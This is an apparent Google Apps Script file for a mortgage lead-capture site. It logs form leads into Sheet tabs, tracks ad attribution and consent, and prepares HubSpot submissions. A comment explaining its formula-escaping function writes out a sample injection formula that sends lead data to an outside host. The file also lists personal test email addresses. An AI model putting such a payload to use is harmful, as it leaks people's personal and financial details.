/**
 * Darren Tsai Mortgage Calculator — Google Apps Script
 *
 * ⚠️  IMPORTANT: You must re-deploy after every code change.
 *     Deploy → Manage deployments → edit → New version → Deploy
 *
 * SETUP INSTRUCTIONS:
 * 1. Open your Google Sheet:
 *    https://docs.google.com/spreadsheets/d/1DZ98FIyaF8hYi-c3FPMLVF71dVVnJWyejg4_J2ZkepI/edit
 * 2. Click Extensions → Apps Script
 * 3. Delete all existing code and paste this entire file
 * 4. Click Save (disk icon)
 * 5. Click Deploy → New deployment  (or Manage deployments → edit existing)
 * 6. Type: Web app
 *    Execute as: Me
 *    Who has access: Anyone
 * 7. Click Deploy → authorize → copy the Web App URL
 * 8. In Netlify → Environment variables:
 *    APPS_SCRIPT_WEBHOOK_URL = <paste URL>
 *    Server-side only. The old name was VITE_GOOGLE_SHEET_WEBHOOK_URL, and the
 *    VITE_ prefix is what inlined this URL into the public client bundle; the
 *    forms now post to /api/lead and the function holds the URL instead.
 *
 * DSCR PDF EMAIL SETUP (sends the personalized DSCR guide via the Netlify function):
 * 1. Add property: NETLIFY_DSCR_PDF_URL = https://realdarrentsai.com/api/send-dscr-guide
 * 2. Add property: NETLIFY_DSCR_PDF_KEY = <same random string set as DSCR_GUIDE_API_KEY
 *    in Netlify's environment variables>
 * 3. If either is blank, the guide email is skipped (Sheets and HubSpot still run normally).
 *
 * REAL ESTATE INVESTING PDF EMAIL SETUP (sends the static case-study PDF via the
 * Netlify function):
 * 1. Add property: NETLIFY_REI_PDF_URL = https://realdarrentsai.com/api/send-rei-guide
 * 2. Add property: NETLIFY_REI_PDF_KEY = <same random string set as REI_GUIDE_API_KEY
 *    in Netlify's environment variables>
 * 3. If either is blank, the guide email is skipped (Sheets and HubSpot still run normally).
 *
 * FHA CALCULATOR EMAIL SETUP (sends the static fha-affordability-calculator.xlsx via
 * the Netlify function):
 * 1. Add property: NETLIFY_FHA_PDF_URL = https://realdarrentsai.com/api/send-fha-guide
 * 2. Add property: NETLIFY_FHA_PDF_KEY = <same random string set as FHA_GUIDE_API_KEY
 *    in Netlify's environment variables>
 * 3. If either is blank, the guide email is skipped (Sheets and HubSpot still run normally).
 *
 * HUBSPOT SETUP (every lead is also submitted to a HubSpot form; see pushToHubSpot):
 * 1. Add property: HUBSPOT_PORTAL_ID = 247401197
 * 2. Add property: HUBSPOT_FORM_GUID = <the GUID of the API-only form Kocah creates>
 * 3. Optional: HUBSPOT_SEND_TESTS = true, to send test leads too (they are always
 *    marked rdt_test_lead = Yes). Anything else, or blank, skips them.
 * 4. Optional: HUBSPOT_FORMS_HOST, only if HubSpot says this portal needs a
 *    regional host. Blank means api.hsforms.com.
 * 5. If either of 1 or 2 is blank, HubSpot is skipped and the Debug tab says so.
 *    Every rdt_* property must also be a (hidden) FIELD on that form, not only a
 *    contact property: the Forms API rejects any field the form does not declare.
 */

const SPREADSHEET_ID = '1DZ98FIyaF8hYi-c3FPMLVF71dVVnJWyejg4_J2ZkepI';

// States Darren is licensed in. Every lead is logged in the sheet; this only
// fills its Licensed State cell and HubSpot's rdt_licensed_state.
const LICENSED_STATES = ['AZ', 'CA', 'FL', 'HI', 'OR', 'PA', 'TN', 'TX'];

function isLicensedState(state) {
  if (!state) return false;
  return LICENSED_STATES.indexOf(String(state).trim().toUpperCase()) !== -1;
}

/**
 * The contact modal, per page.
 *
 * Every copy of it posted source:'MortgageCalculator' from every page until
 * 26 Sep 2026, so the Sheet's Source column, the CRM tags and the GA4 event
 * all said the same thing wherever the lead came from. These sources have no
 * funnel-specific columns, so they still fall through doPost to the generic
 * Leads tab, which holds every field they send; only the label changes.
 */
const CONTACT_SOURCES = {
  'home-contact':                'home',
  // /debt-consolidation/, added 8 Oct with the page. Its calculator posts
  // 'DebtConsolidation' like the homepage's; this is only the modal behind
  // that page's "Contact" button.
  'debt-consolidation-contact':  'debt-consolidation',
  'mortgage-calculator-contact': 'mortgage-calculator',
  'dscr-contact':                'dscr',
  'fha-contact':                 'fha',
  'rei-contact':                 'real-estate-investing',
  // /home-equity/, added with the page (revamp phase 3).
  'home-equity-contact':         'home-equity',
  // /adu/, added with the page (revamp phase 5).
  'adu-contact':                 'adu'
};

// Ad attribution, captured by public/attribution.js and sent with every form.
//
// One contiguous block, in this order, on every lead tab. This list used to be
// append-only, because rows were written by POSITION and inserting a name here
// shifted the meaning of every historical cell to its right. Since the 8 Oct
// schema release rows are written by HEADER NAME (appendByHeader), so a name can
// sit where it belongs, as 'First Touch Medium' now does. What has not changed
// is that a live tab's columns only ever MOVE through migrateLeadTabs(): editing
// this list re-orders nothing on the sheet, it only says where the next
// migration will put things.
const ATTR_HEADERS = [
  'UTM Source', 'UTM Medium', 'UTM Campaign', 'UTM Term', 'UTM Content',
  'Click ID', 'Click ID Type', 'Landing Page', 'Referrer',
  // 'First Touch Medium' was sent by attribution.js from the start and stored
  // nowhere, so "first touch was paid search" could not be told from "first
  // touch was a YouTube link" on any row without a click id.
  'First Touch Source', 'First Touch Medium', 'First Touch Campaign',
  // First-touch click id. The last touch is not enough on its own: someone who
  // clicks an ad, leaves, and returns weeks later through organic YouTube or
  // search has a last touch with no click id at all, so without these the gclid
  // is lost and the lead can never be matched back to the ad that found them.
  // First touch is kept for 90 days, matching Google's gclid lookback,
  // specifically for this case.
  'First Click ID', 'First Click ID Type', 'First Touch At'
];
function attrRow(d) {
  return [
    d.utm_source || '', d.utm_medium || '', d.utm_campaign || '',
    d.utm_term || '', d.utm_content || '',
    d.clickId || '', d.clickIdType || '', d.landingPage || '', d.referrer || '',
    d.firstUtmSource || '', d.firstUtmMedium || '', d.firstUtmCampaign || '',
    d.firstClickId || '', d.firstClickIdType || '', d.firstTouchTs || ''
  ];
}

/**
 * The click id to attribute this lead to: the most recent one, falling back to
 * the first touch. Google accepts a gclid for offline conversion upload within
 * its lookback window, so the first-touch id is still usable weeks later and is
 * far better than uploading nothing.
 */
function effectiveClickId(d) {
  return d.clickId || d.firstClickId || '';
}
function effectiveClickIdType(d) {
  return d.clickIdType || d.firstClickIdType || '';
}

/**
 * Triage columns, the last three on every lead-bearing tab.
 *
 * WHY. The Sheet holds four real leads and more than twenty test rows, with
 * nothing to tell them apart, so the one question anyone actually asks it —
 * "how are we doing" — cannot be answered without reading every row by eye.
 * And once a lead is found there is nowhere to record that it was worked, so
 * the Sheet cannot say which of the four were ever called.
 *
 * Status and Contacted are deliberately left blank for a person to fill in.
 * This is a stopgap until HubSpot: a CRM owns lead state properly, and the
 * point here is only to stop the record being unreadable in the meantime.
 * migrateLeadTabs() carries whatever a person typed into them across by name.
 */
const TRIAGE_HEADERS = ['Test?', 'Status', 'Contacted'];
// Preserve the triage and attribution blocks. Consent evidence is written by header name.
// Keep the original evidence columns readable. SMS Consent remains marketing
// only; the two explicit categories describe this submission, not a CRM subscription
// update or permission to undo a prior STOP. Header-aware writes preserve history.
const SMS_CONSENT_HEADERS = ['SMS Consent', 'SMS Consent Version', 'SMS Consent Text', 'SMS Consent At', 'Privacy Acknowledged', 'Privacy Version', 'SMS Informational Consent', 'SMS Marketing Consent', 'SMS Informational Consent Text', 'Property State', 'Property Use', 'Service Area Result', 'Service Area Version', 'Submission Snapshot'];

/**
 * The addresses used for testing, matched with any +tag stripped.
 *
 * An explicit list, not a rule. "Has a plus tag" would be the easy test and it
 * is wrong: plus addressing is a thing real people use, and mislabelling a real
 * lead as a test is how a real lead stops being called.
 */
const TEST_EMAILS = [
  'liannemaxbalbastro@gmail.com',
  'lmbalbastro@gmail.com',
  'lianne_balbastro@dlsu.edu.ph',
  'darren@realdarrentsai.com'
];

function isTestLead(d) {
  const email = String((d && d.email) || '').trim().toLowerCase();
  if (email) {
    const at = email.indexOf('@');
    if (at > 0) {
      const local = email.slice(0, at).split('+')[0];
      const bare = local + email.slice(at);
      if (TEST_EMAILS.indexOf(bare) !== -1) return true;
    }
  }
  // 555-01xx is the reserved fictional range, so a phone in it was never a real
  // person. This is the fallback for a test run from an address not listed above.
  const digits = String((d && d.phone) || '').replace(/\D/g, '');
  if (/^1?\d{3}55501\d{2}$/.test(digits)) return true;
  return false;
}

/** Test?, then two blank cells for a person to fill in. */
function triageRow(d) {
  return [isTestLead(d) ? 'TEST' : '', '', ''];
}

function licensedCell(d) { return isLicensedState(d.state) ? 'Yes' : 'No'; }

/** A header list and the row that goes with it, as { header: value }. */
function byHeader(headers, row) {
  const out = {};
  for (let i = 0; i < headers.length; i++) out[headers[i]] = row[i];
  return out;
}

/**
 * A value for a cell: blank when the form did not send it. Not `|| ''`, which
 * also blanks a 0, and on the calculator tabs a 0 is an answer (a paid-off
 * mortgage, a saving of nothing) while a blank is a question nobody was asked.
 */
function cell(v) {
  return (v === undefined || v === null) ? '' : v;
}

// ── Lead tab schema ─────────────────────────────────────────────────────────
//
// THE STANDARD ORDER (docs/lead-sheet-schema.md, 8 Oct 2026). Every lead tab is
//
//   LEAD_PREFIX | the funnel's own details | ATTR_HEADERS | TRIAGE_HEADERS
//
// so who the lead is reads the same on every tab, the numbers they gave sit
// together in the middle, and where they came from is one block at the end.
// Before this each tab was the order its columns happened to be added in:
// 'Licensed?' after the attribution block on one tab and before it on the rest,
// the FHA estimator's inputs after 'Contacted', HELOAN's credit tier eighteen
// columns away from the HELOAN payment it priced.
//
// 'Submission ID' is minted in doPost, not by the form, and rides in the
// Follow-ups payload too, so a queue row and its lead row can be matched without
// comparing timestamps. 'Form ID' tells apart two forms on one page; 'Page' is
// the path the form was submitted from, which is not 'Landing Page' (where the
// last touch arrived).
const LEAD_PREFIX = [
  'Timestamp', 'Submission ID', 'First Name', 'Last Name', 'Email', 'Phone', 'State',
  'Licensed?', 'Source', 'Magnet/Goal', 'Form ID', 'Page'
];

/**
 * Headers a live tab may still carry under their old name. appendByHeader
 * writes under the old name while that is what the sheet has, so a lead that
 * arrives between this deployment and the migration still lands in one column,
 * and migrateLeadTabs() renames it. Keyed by the schema's name.
 */
const HEADER_ALIASES = {
  'Magnet/Goal': ['Magnet']
};

/**
 * Columns the schema no longer has, per tab. migrateLeadTabs() does not copy
 * them; they stay readable in the "(old ...)" tab it leaves behind.
 *
 * Best Time to Call and Lead Source ("How did you find me?") came off the debt
 * form on 8 Oct: tracked attribution answers the second, and both were being
 * skipped or left on their opening option often enough to mean little.
 */
const DROPPED_HEADERS = {
  'Debt Consolidation': ['Best Time to Call', 'Lead Source']
};

/** One line per debt the visitor entered, for a single cell Darren can read. */
function debtsSummary(debts) {
  if (!Array.isArray(debts)) return '';
  const money = function (n) { return '$' + Math.round(n).toLocaleString('en-US'); };
  return debts.map(function (x) {
    const bal = Number(x && x.bal) || 0;
    const pmt = Number(x && x.pmt) || 0;
    const rate = Number(x && x.rate) || 0;
    if (!bal && !pmt) return ''; // a row the visitor never filled in
    // Letters and spaces only: the type comes from a dropdown, but the body is
    // whatever was posted, and this cell must never begin with something Sheets
    // would read as a formula.
    const type = String((x && x.type) || '').replace(/[^A-Za-z ]/g, '').trim() || 'Debt';
    return type + ' ' + money(bal) + (rate ? ' at ' + rate + '%' : '') + ' (' + money(pmt) + '/mo)';
  }).filter(function (line) { return !!line; }).join('; ');
}

// Each funnel's own columns, and the value for each. `detailValues` returns
// { header: value }; anything it leaves out is written blank. finishLeadSchema()
// below adds `headers`, `values(d)` and `row(d)` to every entry.
//
// The 'heloc-hei' route was removed here. Nothing on the site sent it, and a
// schema with no sender is a tab that can only ever be created by accident. The
// existing "HELOC vs HEI" tab is untouched: nothing here deletes a tab, so
// whatever it already holds stays readable.
//
// HELOC and home-equity interest now has a page of its own, /home-equity/
// (revamp phase 3), with the 'home-equity' schema below. It is a new source and
// a new tab, deliberately not a revival of 'heloc-hei', whose tab holds rows
// under different columns.

/**
 * A visitor's text, made safe to write into a cell.
 *
 * WHY. appendRow treats a string that starts with "=" as a formula, and every
 * text field on every form is typed by the public. A "first name" of
 * =IMAGE("https://example.com/?"&B2) or =IMPORTXML(...) would become a live
 * formula in Darren's Sheet, able to send other leads' details to someone
 * else's server the moment the tab is opened (security pass, 10 Oct). A
 * leading apostrophe makes Sheets store the text as typed; it is not shown,
 * and getValues reads the text back without it, so nothing downstream changes.
 *
 * Only strings that could start a formula are touched: "=" or "@" first, a
 * tab or carriage return first, or "+" or "-" followed by a letter (a function
 * name). Numbers, and phone numbers such as "+1 714 ...", are left as they are.
 */
function safeCell(v) {
  if (typeof v !== 'string') return v;
  return /^[=@\t\r]|^[+-]\s*[A-Za-z]/.test(v) ? "'" + v : v;
}

/** appendRow for anything that holds a visitor's input. */
function appendSafeRow(sheet, row) {
  sheet.appendRow(row.map(safeCell));
}
const SOURCE_SCHEMAS = {
  'dscr': {
    tab: 'DSCR',
    // 'Down Payment' is the percent the slider sat at ("25%"), as it always
    // was on this tab; the dollar figure is Purchase Price less Loan Amount.
    // Rent, tax, insurance, HOA, P&I and PITIA were sent since the calculator
    // shipped and reached only the Bonzo note, never the Sheet.
    details: [
      'Purchase Price', 'Down Payment', 'Loan Amount', 'Rate', 'Monthly Rent',
      'Annual Tax', 'Annual Insurance', 'Monthly HOA', 'Monthly P&I', 'Monthly PITIA', 'DSCR'
    ],
    detailValues: function (d) {
      return {
        'Purchase Price': d.purchasePrice, 'Down Payment': d.downPayment,
        'Loan Amount': d.loanAmount, 'Rate': d.rate, 'Monthly Rent': d.monthlyRent,
        'Annual Tax': d.annualTax, 'Annual Insurance': d.annualInsurance,
        'Monthly HOA': d.monthlyHoa, 'Monthly P&I': d.monthlyPI,
        'Monthly PITIA': d.monthlyPitia, 'DSCR': d.dscr
      };
    }
  },
  'self-employed': {
    tab: 'Self-Employed',
    details: [],
    detailValues: function (_d) { return {}; }
  },
  'fha': {
    tab: 'FHA',
    // Each estimator cell is blank unless the visitor filled that field: the
    // guide form sits below the estimator and can be submitted without it.
    details: [
      'Credit Score', 'Purchase Price', 'Down Payment %', 'Rate',
      'Annual Tax', 'Annual Insurance', 'Monthly HOA', 'Est. Monthly Payment'
    ],
    detailValues: function (d) {
      return {
        'Credit Score': d.creditScore, 'Purchase Price': d.fhaPrice,
        'Down Payment %': d.fhaDownPct, 'Rate': d.fhaRate, 'Annual Tax': d.fhaTax,
        'Annual Insurance': d.fhaInsurance, 'Monthly HOA': d.fhaHoa,
        'Est. Monthly Payment': d.fhaMonthlyPayment
      };
    }
  },
  'real-estate-investing': {
    tab: 'Real Estate Investing',
    details: [],
    detailValues: function (_d) { return {}; }
  },
  'DebtConsolidation': {
    tab: 'Debt Consolidation',
    // What they owe, then the home, then today's position, then each option
    // with what it was priced at beside it.
    //
    // The savings columns are SIGNED. The site used to send a saving only when
    // it was positive, so an option that raised the payment looked exactly like
    // one that was never priced. A negative number here means the payment goes
    // up by that much; the site shows it to the visitor in those words and never
    // as a negative saving.
    //
    // 'Mortgage Rate' and 'Mortgage Term' are optional on the form and stay
    // blank when skipped, never 0: a 0% rate on a 0-year term reads as an
    // answer. 'Rate Source Date' is the PMMS week the refi figures used, and is
    // blank when the rates call failed and the static fallback priced them.
    details: [
      'Debts', 'Total Debt Balance', 'Total Debt Payment', 'Weighted Avg Rate',
      'Home Value', 'Mortgage Balance', 'Mortgage Payment', 'Mortgage Rate', 'Mortgage Term',
      'Estimated Home Equity', 'Current LTV', 'Current Monthly Payment', 'Monthly Savings',
      'Refi Monthly Payment', 'Refi Monthly Savings',
      'Same-Payoff Refi Payment', 'Same-Payoff Refi Savings',
      'HELOAN Credit Tier', 'HELOAN Term', 'HELOAN Monthly Payment', 'HELOAN Monthly Savings',
      'Rate Source Date'
    ],
    detailValues: function (d) {
      return {
        'Debts': debtsSummary(d.debts),
        'Total Debt Balance': d.totalDebtBalance, 'Total Debt Payment': d.totalDebtPayment,
        'Weighted Avg Rate': d.weightedAvgRate,
        'Home Value': d.homeValue, 'Mortgage Balance': d.mortgageBalance,
        'Mortgage Payment': d.mortgagePayment,
        'Mortgage Rate': d.mortgageRate || '', 'Mortgage Term': d.mortgageTerm || '',
        'Estimated Home Equity': d.estimatedEquity, 'Current LTV': d.currentLtv,
        'Current Monthly Payment': d.currentMonthlyPayment,
        'Monthly Savings': d.monthlySavings,
        'Refi Monthly Payment': d.refiMonthlyPayment, 'Refi Monthly Savings': d.refiMonthlySavings,
        'Same-Payoff Refi Payment': d.refiSameTermPayment,
        'Same-Payoff Refi Savings': d.refiSameTermSavings,
        // What the HELOAN figures were priced at. Without them a saving quoted
        // at the 680+ tier is indistinguishable from one quoted at 580.
        'HELOAN Credit Tier': d.heloanCreditTier, 'HELOAN Term': d.heloanTermYears,
        'HELOAN Monthly Payment': d.heloanMonthlyPayment,
        'HELOAN Monthly Savings': d.heloanMonthlySavings,
        'Rate Source Date': d.rateSourceDate
      };
    }
  },
  // /home-equity/ (revamp phase 3) and /adu/ (phase 5). A balance of 0 is a
  // paid-off home and cell() keeps it as 0.
  'home-equity': {
    tab: 'Home Equity',
    details: [
      'Home Value', 'Mortgage Balance', 'Estimated Home Equity', 'Current LTV',
      'Goal', 'Amount Exploring', 'Illustrative CLTV', 'Preference'
    ],
    detailValues: function (d) {
      return {
        'Home Value': d.homeValue, 'Mortgage Balance': d.mortgageBalance,
        'Estimated Home Equity': d.estimatedEquity, 'Current LTV': d.currentLtv,
        'Goal': d.goal, 'Amount Exploring': d.amountExploring,
        'Illustrative CLTV': d.illustrativeCltv, 'Preference': d.preference
      };
    }
  },
  'adu': {
    tab: 'ADU',
    details: [
      'Home Value', 'Mortgage Balance', 'Estimated Home Equity', 'Current LTV',
      'Project Cost', 'Amount to Finance', 'Illustrative CLTV', 'Project Purpose'
    ],
    detailValues: function (d) {
      return {
        'Home Value': d.homeValue, 'Mortgage Balance': d.mortgageBalance,
        'Estimated Home Equity': d.estimatedEquity, 'Current LTV': d.currentLtv,
        'Project Cost': d.projectCost, 'Amount to Finance': d.amountToFinance,
        'Illustrative CLTV': d.illustrativeCltv, 'Project Purpose': d.projectPurpose
      };
    }
  }
};

// Everything without a schema of its own: the contact modal on every page (see
// CONTACT_SOURCES), the generic calculator form, and any source this file has
// never heard of, which must still land somewhere rather than be lost.
//
// `|| ''` here, not cell(): no contact form asks for a term and the loan and
// rate are optional, so a 0 on this tab was never an answer.
const LEADS_SCHEMA = {
  tab: 'Leads',
  defaultSource: 'SimpleMortgageCalculator',
  details: ['Loan Amount', 'Term (Years)', 'Rate (%)', 'Goals', 'Target Outcome', 'Timeline'],
  detailValues: function (d) {
    return {
      'Loan Amount': d.loanAmount || '', 'Term (Years)': d.termYears || '',
      'Rate (%)': d.annualRate || '', 'Goals': d.message || '',
      'Target Outcome': d.target || '', 'Timeline': d.timeline || ''
    };
  }
};

/**
 * Completes a schema: its full header list in the standard order, `values(d)`
 * as { header: value } for appendByHeader, and `row(d)` as the same values in
 * header order.
 */
function finishLeadSchema(schema) {
  schema.headers = LEAD_PREFIX.concat(schema.details, SMS_CONSENT_HEADERS, ATTR_HEADERS, TRIAGE_HEADERS);
  schema.values = function (d) {
    const v = byHeader(LEAD_PREFIX, [
      d.timestamp || new Date().toISOString(),
      d.submissionId || '',
      d.firstName || '', d.lastName || '', d.email || '', d.phone || '', d.state || '',
      licensedCell(d),
      d.source || schema.defaultSource || '',
      d.magnet || '',
      d.formId || '',
      urlPath(d.pageUri)
    ]);
    const own = schema.detailValues(d);
    schema.details.forEach(function (h) { v[h] = cell(own[h]); });
    const consent = byHeader(SMS_CONSENT_HEADERS, [d.smsConsent === true ? 'Yes' : d.smsConsent === false ? 'No' : '', d.smsConsentVersion || '', d.smsConsentText || '', d.smsConsentAt || '', d.privacyAcknowledged === true ? 'Yes' : d.privacyAcknowledged === false ? 'No' : '', d.privacyVersion || '', d.smsInformationalConsent === true ? 'Yes' : d.smsInformationalConsent === false ? 'No' : '', d.smsMarketingConsent === true ? 'Yes' : d.smsMarketingConsent === false ? 'No' : '', d.smsInformationalConsentText || '', d.propertyState || '', d.propertyUse || '', d.serviceAreaResult || '', d.serviceAreaVersion || '', JSON.stringify(leadSnapshot(d))]);
    SMS_CONSENT_HEADERS.forEach(function (h) { v[h] = consent[h]; });
    const attr = byHeader(ATTR_HEADERS, attrRow(d));
    ATTR_HEADERS.forEach(function (h) { v[h] = attr[h]; });
    const triage = byHeader(TRIAGE_HEADERS, triageRow(d));
    TRIAGE_HEADERS.forEach(function (h) { v[h] = triage[h]; });
    return v;
  };
  schema.row = function (d) {
    const v = schema.values(d);
    return schema.headers.map(function (h) { return v[h]; });
  };
  return schema;
}
Object.keys(SOURCE_SCHEMAS).forEach(function (key) { finishLeadSchema(SOURCE_SCHEMAS[key]); });
finishLeadSchema(LEADS_SCHEMA);

const LANDING_SOURCES = Object.keys(SOURCE_SCHEMAS);

// The two lists other code and the tests know by name.
const LEAD_HEADERS = LEADS_SCHEMA.headers;
const DEBT_CONSOLIDATION_HEADERS = SOURCE_SCHEMAS['DebtConsolidation'].headers;

/** Every lead tab's schema, once each: what the audit and the migration walk. */
function leadTabSchemas() {
  return Object.keys(SOURCE_SCHEMAS).map(function (key) { return SOURCE_SCHEMAS[key]; }).concat([LEADS_SCHEMA]);
}

// Newsletter is a different shape: email only, no name or phone, and no
// attribution columns. Nothing on the site sends source 'newsletter' any more,
// so this exists to keep the historical tab readable.
const NEWSLETTER_HEADERS = [
  'Timestamp', 'Email', 'Source'
];

// Qualify has no sender either and keeps the shape it was created with. It is
// written by header name like the lead tabs, so the attribution column added
// above cannot shift it, but it is not part of the standard order and
// migrateLeadTabs() leaves it alone.
const QUALIFY_HEADERS = [
  'Timestamp', 'First Name', 'Last Name', 'Email', 'Phone',
  'Loan Type', 'Timeline', 'Price Range', 'Credit Range',
  'Employment', 'Notes', 'Source'
].concat(ATTR_HEADERS, TRIAGE_HEADERS);

function styleHeaderRange(range) {
  range.setFontWeight('bold');
  range.setBackground('#223d55');
  range.setFontColor('#ffffff');
}

function createSheetWithHeaders(ss, name, headers) {
  const sheet = ss.insertSheet(name);
  sheet.appendRow(headers);
  styleHeaderRange(sheet.getRange(1, 1, 1, headers.length));
  sheet.setFrozenRows(1);
  return sheet;
}

// For the tabs that are still written by position: Follow-ups, Debug and
// Newsletter. Their columns are fixed and only ever grow at the end.
function getOrCreateSheet(ss, name, headers) {
  const sheet = ss.getSheetByName(name);
  if (!sheet) return createSheetWithHeaders(ss, name, headers);
  ensureHeaders(sheet, headers);
  return sheet;
}

// Adds header cells for columns a POSITIONAL tab has gained since it was
// created. Append-only and idempotent by construction: it writes just the tail
// past the sheet's current last column and never touches an existing header
// cell.
//
// NEVER call this on a lead tab. It assumes the sheet's columns are a prefix of
// `headers`, which stopped being true for the lead tabs the day their order
// changed: on a tab still in its old order it would write the tail of the NEW
// list past the old last column, naming columns that are not there. That is the
// @38 incident again. Lead tabs go through appendByHeader, which finds each
// header by name.
function ensureHeaders(sheet, headers) {
  const lastCol = sheet.getLastColumn();
  if (lastCol >= headers.length) return;
  const extra = headers.slice(lastCol);
  const range = sheet.getRange(1, lastCol + 1, 1, extra.length);
  range.setValues([extra]);
  styleHeaderRange(range);
}

/** A sheet's header row as trimmed strings, '' for an empty cell. */
function liveHeaders(sheet) {
  const lastCol = sheet.getLastColumn();
  if (lastCol < 1) return [];
  return sheet.getRange(1, 1, 1, lastCol).getValues()[0].map(function (h) {
    return String(h === null || h === undefined ? '' : h).trim();
  });
}

/**
 * Appends one row, putting each value under the live header of the same name.
 *
 * WHY BY NAME. Rows used to be built in the order of a header list in this file
 * and appended blind. That holds only while the sheet's columns are in that same
 * order, and nothing checked. On @38 two columns went into a list one place
 * left of where the sheet had them, and every cell from Test? onwards was
 * written under the wrong header: a TEST flag under Contacted. Every test
 * passed, because the row and the list agreed with each other.
 *
 * Here the sheet's own header row decides where a value goes, so this file and
 * the sheet cannot disagree about position. That also takes the deadline out of
 * a migration: this code is correct on a tab in its old order, in its new order,
 * or half way between.
 *
 * A header the sheet lacks is added at the END, which is the one place that
 * disturbs nothing. A header the sheet has twice gets the value in the first
 * and a blank in the rest. Either, or columns in an order the schema does not
 * describe, is reported by alertSheetDrift, and the lead is written regardless:
 * refusing it would turn a cosmetic problem into a lost lead.
 */
function appendByHeader(ss, sheet, tabName, headers, values) {
  let live = liveHeaders(sheet);

  // The name each schema header goes by on this sheet: its own, or an old name
  // the sheet still carries.
  const nameOnSheet = {};
  const missing = [];
  headers.forEach(function (h) {
    if (live.indexOf(h) !== -1) { nameOnSheet[h] = h; return; }
    const aliases = Object.prototype.hasOwnProperty.call(HEADER_ALIASES, h) ? HEADER_ALIASES[h] : [];
    for (let i = 0; i < aliases.length; i++) {
      if (live.indexOf(aliases[i]) !== -1) { nameOnSheet[h] = aliases[i]; return; }
    }
    nameOnSheet[h] = h;
    missing.push(h);
  });

  if (missing.length) {
    const range = sheet.getRange(1, live.length + 1, 1, missing.length);
    range.setValues([missing]);
    styleHeaderRange(range);
    live = live.concat(missing);
  }

  const row = [];
  for (let i = 0; i < live.length; i++) row.push('');
  headers.forEach(function (h) {
    const at = live.indexOf(nameOnSheet[h]); // first occurrence, if the sheet has it twice
    // safeCell: every value here can be a visitor's text (see safeCell).
    if (at !== -1) row[at] = safeCell(cell(values[h]));
  });
  sheet.appendRow(row);

  // Consent fields intentionally append without a migration. Compare the original
  // schema separately so this expected extension does not alert Darren per lead tab.
  // All other missing, renamed, duplicated or reordered headers still alert.
  const isBase = function (h) { return SMS_CONSENT_HEADERS.indexOf(h) === -1; };
  const drift = describeSheetDrift(live.slice(0, live.length - missing.length).filter(isBase), headers.filter(isBase), missing.filter(isBase));
  if (drift) alertSheetDrift(ss, tabName, drift);
}

/**
 * What is wrong with a tab's columns, in words, or '' when the tab is exactly
 * the schema (with or without extra columns after it, which a person is free to
 * add). Pure, so the audit, the alert and the tests all read the same verdict.
 */
function describeSheetDrift(live, headers, missing) {
  const problems = [];
  if (missing && missing.length) problems.push('missing: ' + missing.join(', '));
  const seen = {};
  const twice = [];
  live.forEach(function (h) {
    if (h === '') return;
    if (Object.prototype.hasOwnProperty.call(seen, h) && twice.indexOf(h) === -1) twice.push(h);
    seen[h] = true;
  });
  if (twice.length) problems.push('there twice: ' + twice.join(', '));
  for (let i = 0; i < headers.length; i++) {
    if (live[i] !== headers[i]) {
      problems.push('order differs from column ' + (i + 1) + ' (sheet has "' + (live[i] || '') +
        '", schema has "' + headers[i] + '")');
      break;
    }
  }
  return problems.join('; ');
}

/**
 * Says, at most once every 6 hours per tab, that a tab's columns are not the
 * schema's. Expected between deploying this file and running migrateLeadTabs();
 * at any other time it means someone moved, renamed or deleted a column by hand.
 * Not alertFailure: nothing failed, the lead is saved under the right headers.
 */
function alertSheetDrift(ss, tabName, drift) {
  try {
    logDebug(ss, 'appendByHeader: "' + tabName + '" columns differ from the schema: ' + drift, '');
    const cache = CacheService.getScriptCache();
    const key = 'sheet_drift_' + String(tabName).replace(/[^A-Za-z0-9]/g, '_');
    if (cache.get(key)) return;
    cache.put(key, '1', 21600); // 6h, CacheService's maximum
    MailApp.sendEmail({
      to: ALERT_EMAIL,
      subject: 'Sheet columns out of order: ' + tabName,
      body: 'The "' + tabName + '" tab\'s columns are not in the order the script expects.\n\n  ' + drift + '\n\n' +
        'NO LEAD IS AFFECTED. Rows are written under their header by name, so every value is in the right column.\n\n' +
        'If the script was just updated, this is expected until migrateLeadTabs() has been run from the Apps Script editor ' +
        '(run auditLeadTabs() first and read the Debug tab).\n' +
        'Otherwise a column on this tab was moved, renamed or deleted by hand. Renaming a header back fixes it; ' +
        'so does running migrateLeadTabs().\n\n' +
        'This email repeats at most every 6 hours per tab.'
    });
  } catch (err) {
    Logger.log('alertSheetDrift failed: ' + err.toString()); // never break a lead over a notice
  }
}

/**
 * The tab a lead schema writes to, created in the standard order if it does not
 * exist. An existing tab is returned untouched: appendByHeader works out where
 * things go, and only migrateLeadTabs() moves a column.
 */
function openLeadSheet(ss, schema) {
  return ss.getSheetByName(schema.tab) || createSheetWithHeaders(ss, schema.tab, schema.headers);
}

/** Writes one lead to its schema's tab. */
function writeLead(ss, schema, data) {
  appendByHeader(ss, openLeadSheet(ss, schema), schema.tab, schema.headers, schema.values(data));
}

// The landing pages send display strings ("$300,000", "7.50%", "25%");
// HubSpot's numeric loan_amount needs a bare number. Returns '' when there's
// nothing usable.
function plainNumber(value) {
  if (value === null || value === undefined) return '';
  const cleaned = String(value).replace(/[^0-9.]/g, '');
  return cleaned && !isNaN(parseFloat(cleaned)) ? cleaned : '';
}

// ── HubSpot ─────────────────────────────────────────────────────────────────
//
// The CRM. The Sheet stays the record of every lead; HubSpot is where Darren
// works them. Bonzo was retired on 15 Oct 2026 (meeting with Darren), so
// nothing else receives the lead.
// Agreed with Kocah on 29 Sep: keep our forms, submit each lead to a HubSpot
// form built only as an API target, with the click id attached.
//
// Forms API rather than the CRM API because a form submission is what HubSpot
// attributes: with the visitor's hutk in the context it joins the contact to the
// pageviews the tracking code recorded, including the gclid landing visit. It
// also needs no private-app token, only the two ids below, and it dedupes by
// email, so a returning lead updates one contact instead of creating another.

const HUBSPOT_DEFAULT_HOST = 'api.hsforms.com';

// Click ids, by the type attribution.js reports, to the property each one lands
// in. An explicit table so an unexpected clickIdType from a tampered body can
// never name a property of its own choosing.
const HUBSPOT_CLICK_ID_PROPS = {
  gclid: 'rdt_gclid', gbraid: 'rdt_gbraid', wbraid: 'rdt_wbraid',
  msclkid: 'rdt_msclkid', fbclid: 'rdt_fbclid'
};

// Never dropped by the resubmit below. Without an email HubSpot has nothing to
// make a contact from, so a submission stripped of it would be a 200 that put
// nobody in the CRM.
const HUBSPOT_REQUIRED_FIELDS = ['email'];

/** Path of a URL, without the query or fragment. '' when it is not a URL. */
function urlPath(uri) {
  const m = /^https?:\/\/[^/?#]+(\/[^?#]*)?/i.exec(String(uri || ''));
